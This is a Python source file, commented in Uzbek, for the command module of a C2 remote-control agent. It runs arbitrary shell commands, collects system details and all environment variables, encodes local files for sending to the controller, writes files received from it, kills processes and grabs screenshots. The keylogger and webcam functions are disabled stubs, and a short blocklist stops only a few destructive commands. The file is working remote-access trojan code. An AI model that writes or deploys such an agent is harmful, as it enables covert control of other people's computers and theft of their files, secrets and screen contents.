"""
C2 Platform Commands - Asosiy komandalar moduli
"""

import os
import subprocess
import base64
import json
from datetime import datetime
from typing import Dict, Any


class CommandHandler:
    """Komandalarni boshqarish uchun klass"""
    
    def __init__(self):
        self.supported_commands = {
            'sysinfo': self.get_system_info,
            'exec': self.execute_shell_command,
            'pwd': self.get_current_directory,
            'ls': self.list_directory,
            'cd': self.change_directory,
            'download': self.download_file,
            'upload': self.upload_file,
            'ps': self.list_processes,
            'kill': self.kill_process,
            'screenshot': self.take_screenshot,
            'keylog': self.start_keylogger,
            'webcam': self.capture_webcam
        }
    
    def handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Komandani qayta ishlash"""
        try:
            cmd_type = command.get('type', '').lower()
            cmd_data = command.get('data', '')
            
            if cmd_type in self.supported_commands:
                result = self.supported_commands[cmd_type](cmd_data)
                return {
                    'success': True,
                    'command': cmd_type,
                    'data': result,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                return {
                    'success': False,
                    'error': f'Noma\'lum komanda: {cmd_type}',
                    'timestamp': datetime.now().isoformat()
                }
        except Exception as e:
            return {
                'success': False,
                'error': f'Komanda bajarishda xato: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }
    
    def get_system_info(self, data: str = None) -> Dict[str, Any]:
        """Tizim ma'lumotlarini olish"""
        try:
            import platform
            import socket
            
            info = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'system': platform.system(),
                'processor': platform.processor(),
                'architecture': platform.architecture(),
                'python_version': platform.python_version(),
                'username': os.getenv('USERNAME') or os.getenv('USER'),
                'current_directory': os.getcwd(),
                'environment_variables': dict(os.environ)
            }
            
            # Qo'shimcha ma'lumotlar
            try:
                import psutil
                info['memory'] = {
                    'total': psutil.virtual_memory().total,
                    'available': psutil.virtual_memory().available,
                    'percent': psutil.virtual_memory().percent
                }
                info['cpu_count'] = psutil.cpu_count()
                info['cpu_percent'] = psutil.cpu_percent()
            except ImportError:
                pass
            
            return info
        except Exception as e:
            return {'error': f'System info olishda xato: {str(e)}'}
    
    def execute_shell_command(self, command: str) -> Dict[str, Any]:
        """Shell komandani bajarish"""
        try:
            if not command:
                return {'error': 'Bo\'sh komanda'}
            
            # Xavfli komandalarni bloklash
            dangerous_commands = [
                'format', 'del /f', 'rm -rf', 'shutdown', 'reboot', 
                'mkfs', 'dd if=', 'fdisk', 'parted'
            ]
            
            if any(dangerous in command.lower() for dangerous in dangerous_commands):
                return {'error': 'Xavfli komanda bloklandi'}
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'command': command,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Komanda timeout (30s)'}
        except Exception as e:
            return {'error': f'Shell xatosi: {str(e)}'}
    
    def get_current_directory(self, data: str = None) -> Dict[str, Any]:
        """Joriy papkani olish"""
        try:
            return {'current_directory': os.getcwd()}
        except Exception as e:
            return {'error': f'PWD xatosi: {str(e)}'}
    
    def list_directory(self, path: str = None) -> Dict[str, Any]:
        """Papka tarkibini ko'rsatish"""
        try:
            target_path = path if path else os.getcwd()
            
            if not os.path.exists(target_path):
                return {'error': f'Papka topilmadi: {target_path}'}
            
            items = []
            for item in os.listdir(target_path):
                item_path = os.path.join(target_path, item)
                items.append({
                    'name': item,
                    'type': 'directory' if os.path.isdir(item_path) else 'file',
                    'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0,
                    'modified': datetime.fromtimestamp(os.path.getmtime(item_path)).isoformat()
                })
            
            return {
                'path': target_path,
                'items': items,
                'count': len(items)
            }
        except Exception as e:
            return {'error': f'LS xatosi: {str(e)}'}
    
    def change_directory(self, path: str) -> Dict[str, Any]:
        """Papkani o'zgartirish"""
        try:
            if not path:
                return {'error': 'Papka yo\'li talab qilinadi'}
            
            os.chdir(path)
            return {
                'old_directory': os.getcwd(),
                'new_directory': path,
                'message': f'Papka o\'zgartirildi: {path}'
            }
        except Exception as e:
            return {'error': f'CD xatosi: {str(e)}'}
    
    def download_file(self, file_path: str) -> Dict[str, Any]:
        """Faylni serverga yuklash (agent dan server ga)"""
        try:
            if not file_path or not os.path.exists(file_path):
                return {'error': f'Fayl topilmadi: {file_path}'}
            
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # 10MB limit
                return {'error': 'Fayl juda katta (10MB limit)'}
            
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            return {
                'filename': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'data': file_data,
                'message': 'Fayl muvaffaqiyatli o\'qildi'
            }
        except Exception as e:
            return {'error': f'Download xatosi: {str(e)}'}
    
    def upload_file(self, file_data: Dict[str, str]) -> Dict[str, Any]:
        """Faylni agentga yuklash (server dan agent ga)"""
        try:
            filename = file_data.get('filename')
            data = file_data.get('data')
            
            if not filename or not data:
                return {'error': 'Fayl nomi va ma\'lumotlar talab qilinadi'}
            
            file_content = base64.b64decode(data)
            
            with open(filename, 'wb') as f:
                f.write(file_content)
            
            return {
                'filename': filename,
                'size': len(file_content),
                'message': 'Fayl muvaffaqiyatli saqlandi'
            }
        except Exception as e:
            return {'error': f'Upload xatosi: {str(e)}'}
    
    def list_processes(self, data: str = None) -> Dict[str, Any]:
        """Jarayonlar ro'yxatini olish"""
        try:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {
                'processes': processes,
                'count': len(processes)
            }
        except ImportError:
            return {'error': 'psutil kutubxonasi o\'rnatilmagan'}
        except Exception as e:
            return {'error': f'PS xatosi: {str(e)}'}
    
    def kill_process(self, pid: str) -> Dict[str, Any]:
        """Jarayonni to'xtatish"""
        try:
            import psutil
            
            if not pid or not pid.isdigit():
                return {'error': 'Yaroqsiz PID'}
            
            pid_int = int(pid)
            proc = psutil.Process(pid_int)
            proc_name = proc.name()
            proc.terminate()
            
            return {
                'pid': pid_int,
                'name': proc_name,
                'message': f'Jarayon to\'xtatildi: {proc_name} (PID: {pid_int})'
            }
        except ImportError:
            return {'error': 'psutil kutubxonasi o\'rnatilmagan'}
        except psutil.NoSuchProcess:
            return {'error': f'Jarayon topilmadi: PID {pid}'}
        except Exception as e:
            return {'error': f'Kill xatosi: {str(e)}'}
    
    def take_screenshot(self, data: str = None) -> Dict[str, Any]:
        """Ekran suratini olish"""
        try:
            # PIL (Pillow) kutubxonasi kerak
            from PIL import ImageGrab
            import io
            
            screenshot = ImageGrab.grab()
            
            # Base64 ga o'girish
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            screenshot_data = base64.b64encode(buffer.getvalue()).decode()
            
            return {
                'width': screenshot.width,
                'height': screenshot.height,
                'data': screenshot_data,
                'format': 'PNG',
                'message': 'Screenshot muvaffaqiyatli olindi'
            }
        except ImportError:
            return {'error': 'PIL (Pillow) kutubxonasi o\'rnatilmagan'}
        except Exception as e:
            return {'error': f'Screenshot xatosi: {str(e)}'}
    
    def start_keylogger(self, data: str = None) -> Dict[str, Any]:
        """Keylogger (Ta'lim maqsadida - haqiqiy ishlatilmasin!)"""
        return {
            'error': 'Keylogger funksiyasi ta\'lim maqsadida o\'chirib qo\'yilgan',
            'message': 'Bu funksiya xavfli hisoblanadi'
        }
    
    def capture_webcam(self, data: str = None) -> Dict[str, Any]:
        """Webcam surati (Ta'lim maqsadida - haqiqiy ishlatilmasin!)"""
        return {
            'error': 'Webcam funksiyasi ta\'lim maqsadida o\'chirib qo\'yilgan',
            'message': 'Bu funksiya maxfiylikni buzishi mumkin'
        }